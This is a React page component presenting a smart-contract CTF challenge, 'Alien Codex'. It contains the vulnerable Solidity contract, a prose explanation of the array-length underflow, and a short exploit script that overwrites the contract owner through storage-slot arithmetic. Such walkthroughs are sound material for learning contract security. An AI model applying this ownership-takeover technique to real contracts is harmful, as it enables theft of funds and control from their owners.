import { useState } from "react";
import { Light as SyntaxHighlighter } from "react-syntax-highlighter";
import { atomOneDark } from "react-syntax-highlighter/dist/esm/styles/hljs";
import { AiFillCopy, AiOutlineFileDone } from "react-icons/ai";
import TextDiv from "../../components/TextDiv";

const AlienCodex = () => {
  const [copy, setCopy] = useState(false);
  const codeString = `
  // SPDX-License-Identifier: MIT
  pragma solidity ^0.5.0;
  
  import '../helpers/Ownable-05.sol';
  
  contract AlienCodex is Ownable {
  
    bool public contact;
    bytes32[] public codex;
  
    modifier contacted() {
      assert(contact);
      _;
    }
    
    function make_contact() public {
      contact = true;
    }
  
    function record(bytes32 _content) contacted public {
      codex.push(_content);
    }
  
    function retract() contacted public {
      codex.length--;
    }
  
    function revise(uint i, bytes32 _content) contacted public {
      codex[i] = _content;
    }
  }`;

  const solutionCode = `
  const key = await web3.eth.getStorageAt("0xFe0C944A9eb3B7E012Fd546a7068b5E9e18B86Cf", 0)

  const p = web3.utils.keccak256(web3.eth.abi.encodeParameters(["uint256"], [1]))

  const i = BigInt(2 ** 256) - BigInt(p)

  const address = '0x' + '0'.repeat(22) + 01 + player.slice(2)

  await contract.revise(i, address)
  `

  return (
    <div>
      <h1 className="headerText">Alien Codex</h1>
      <div className="content">
        <div className="highlighterHeader">
          <p className="smallText"> Example code</p>
          {copy ? (
            <button className="copyButton">
              <span>
                <AiOutlineFileDone />
              </span>
              Copied!
            </button>
          ) : (
            <button
              className="copyButton"
              onClick={() => {
                navigator.clipboard.writeText(codeString);
                setCopy(true);
                setTimeout(() => {
                  setCopy(false);
                }, 3000);
              }}
            >
              <span>
                <AiFillCopy />
              </span>
              Copy Code
            </button>
          )}
        </div>
        <SyntaxHighlighter
          language="solidity"
          style={atomOneDark}
          customStyle={{
            padding: "25px",
            borderRadius: "0.375rem",
          }}
          wrapLongLines={true}
        >
          {codeString}
        </SyntaxHighlighter>
      </div>
      <div className="textBox">
        <TextDiv
          title="Hack"
          text="  if we will use this command for contract, we will get slot 0, and there is the address and the bool
          Afther this we can see that in retract() function doesn't exist overflow check
          and  becouse of it will be 2 ** 256 -1, all contract  storage can be accessed with this array, 
          address elements count stored at slot 1, so p = keccak256(slot) or, p = keccak256(1), as we know the last slot of contract storage is 
          2 ** 256 - 1, so for accessing it we need to get 2 ** 256 - 1 - p, it means if we will use 2 ** 256 - p we will get element at slot 0 (It will overflow to 0 slot),
          so if we will access by index 2 ** 256 - p, we will change owner."
        />
      </div>
      <SyntaxHighlighter
        language="solidity"
        style={atomOneDark}
        customStyle={{
          padding: "25px",
          borderRadius: "0.375rem",
        }}
        wrapLongLines={true}
      >
        {solutionCode}
      </SyntaxHighlighter>
    </div>
  );
};

export default AlienCodex;
